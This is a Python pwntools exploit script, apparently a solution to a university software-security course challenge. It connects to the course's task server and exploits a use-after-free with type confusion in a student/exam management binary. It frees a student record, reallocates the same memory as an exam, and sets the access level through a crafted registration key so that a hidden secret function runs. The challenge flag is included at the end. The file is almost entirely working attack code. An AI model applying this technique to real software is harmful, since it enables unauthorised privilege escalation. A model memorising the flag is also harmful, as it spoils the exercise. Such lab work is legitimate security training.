from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *register_to_exam+137
b *secret
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33251)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti "$(docker ps -q -f \'ancestor=softsec/debug/practice-4\')" /bin/bash -c \'gdb -x /gdbscript/gdbscript -p "$(pgrep -n vuln)"\'', shell=True)
#sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def create_student(name, rubID):
    p.sendline(b"1")
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"RUB ID: ", rubID)
    
    p.recvuntil(b"Student created at ")
    student_ptr = int(p.recvline(), 16)
    return student_ptr


def register_to_exam(name, rubID, registrationKey):
    p.sendline(b"4")
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"RUB ID: ", rubID)
    p.sendlineafter(b"Registration Key: ", registrationKey)
    
    p.recvuntil(b"Exam created at ")
    exam_ptr = int(p.recvline(), 16)
    return exam_ptr


def list_students():
    p.sendline(b"2")
    print(p.recv())


def delete_student(index):
    p.sendline(b"3")
    p.sendlineafter(b"Index: ", index)


def secret(index):
    p.sendline(b"42")
    p.sendlineafter(b"Index: ", index)
    print(p.recv())

# use after free + type confusion
# create student
# delete student
# create exam - the same address is allocated again
# registrationKey can be used to set access_level in UAF student
# then call secret

create_student(b"H4ck3r", b"1")
delete_student(b"0")
register_to_exam(b"3x4m", b"1", str(0xdba2ab03 ^ 0xdeadbeef).encode())
secret(b"0")






# p (student_t)*0x55a025b9e2a0






p.interactive()

#softsec{r_bef6fCsiy561XRf_8i6h98BecV9zlZE5boX7DF34Evs3OI6Ewwt5VAJJ5o2Sup}